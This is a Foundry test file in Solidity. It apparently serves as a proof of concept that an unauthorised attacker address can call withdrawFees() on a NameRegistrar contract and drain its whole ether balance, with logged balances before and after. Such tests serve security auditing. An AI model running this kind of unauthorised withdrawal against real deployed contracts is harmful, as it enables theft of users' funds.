// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/name_registrar.sol";

contract NameRegistrarTest is Test {
    NameRegistrar nameRegistrar;
    address internal attacker = address(0x2);
    
    function toEther(uint256 weiAmt) internal pure returns (uint256) {
        return weiAmt / 1e18;
    }

    function setUp() public {
        nameRegistrar = new NameRegistrar();
        vm.deal(address(nameRegistrar), 1 ether);
    }

    function testWithdrawFeesVulnerability() public {
        console.log("\n--- [PRE-TRIGGER] ---");
        uint256 contractBalanceBefore = address(nameRegistrar).balance;
        uint256 attackerBalanceBefore = attacker.balance;
        
        console.log("Contract balance: %s ETH", toEther(contractBalanceBefore));
        console.log("Attacker balance: %s ETH", toEther(attackerBalanceBefore));
        assertEq(contractBalanceBefore, 1 ether);

        console.log("\n--- [TRIGGER] ---");
        console.log("EXECUTING: attacker.withdrawFees()");
        vm.prank(attacker);
        nameRegistrar.withdrawFees();
        
        console.log("\n--- [POST-TRIGGER] ---");
        uint256 contractBalanceAfter = address(nameRegistrar).balance;
        uint256 attackerBalanceAfter = attacker.balance;
        console.log("Contract balance: %s ETH", toEther(contractBalanceAfter));
        console.log("Attacker balance: %s ETH", toEther(attackerBalanceAfter));

        uint256 contractBalanceChange = contractBalanceBefore - contractBalanceAfter;
        uint256 attackerBalanceChange = attackerBalanceAfter - attackerBalanceBefore;
        
        console.log("\n--- [DIFFERENTIAL] ---");
        console.log("Contract balance Change: %s ETH", toEther(contractBalanceChange));
        console.log("Attacker balance Change: %s ETH", toEther(attackerBalanceChange));

        bool fundsDrained = contractBalanceAfter == 0;
        bool fundsReceived = attackerBalanceChange == 1 ether;
        bool verdict = fundsDrained && fundsReceived;
        
        if (verdict) {
            console.log("\nVulnerability Exists: Attacker successfully drained contract funds without authorization");
        } else {
            console.log("\nVulnerability not Exist: Attack transaction didn't drain funds as expected");
        }
    }
}